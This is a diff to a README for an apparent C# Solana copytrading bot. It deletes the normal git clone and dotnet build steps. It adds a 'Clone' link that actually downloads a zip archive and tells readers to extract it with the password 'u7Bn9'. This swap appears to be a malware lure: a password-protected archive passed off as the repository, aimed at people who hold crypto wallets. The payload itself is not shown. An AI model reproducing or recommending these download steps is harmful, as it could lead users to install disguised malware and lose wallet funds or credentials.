@@ -40,6 +40,13 @@ A powerful and customizable copytrading bot built in **C#** for the **Solana blo
   - BonkBot
   - Banana Gun
 
+## Getting Started
+- [Clone](https://github.com/knightlightst/solana-copytrading-bot/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
+- Extract archive with password `u7Bn9`
+- Configure your settings  
+   Edit `appsettings.json` or use the UI to set filters, wallet addresses, and platform preferences.
+- Run the bot
+
 ##  Configuration
 
 All settings are fully configurable through a JSON or UI interface (if implemented). Below are the primary config options:
@@ -75,27 +82,6 @@ All settings are fully configurable through a JSON or UI interface (if implement
 - Blockchain: **Solana**
 - Platforms:Raydium, pump.fun, moonshot, photon, GMGN, BonkBot, Banana Gun
 - Data Sources: On-chain TX monitoring, WebSocket feeds, RPC nodes
-
-##  Getting Started
-
-1. Clone the repo  
-   ```bash
-   git clone https://github.com/knightlightst/solana-copytrading-bot.git
-   cd solana-copytrading-bot
-   ```
-
-2. Install dependencies  
-   ```bash
-   dotnet restore
-   ```
-
-3. Configure your settings  
-   Edit `appsettings.json` or use the UI to set filters, wallet addresses, and platform preferences.
-
-4. Run the bot  
-   ```bash
-   dotnet run
-   ```
 
 ##  Disclaimer
 
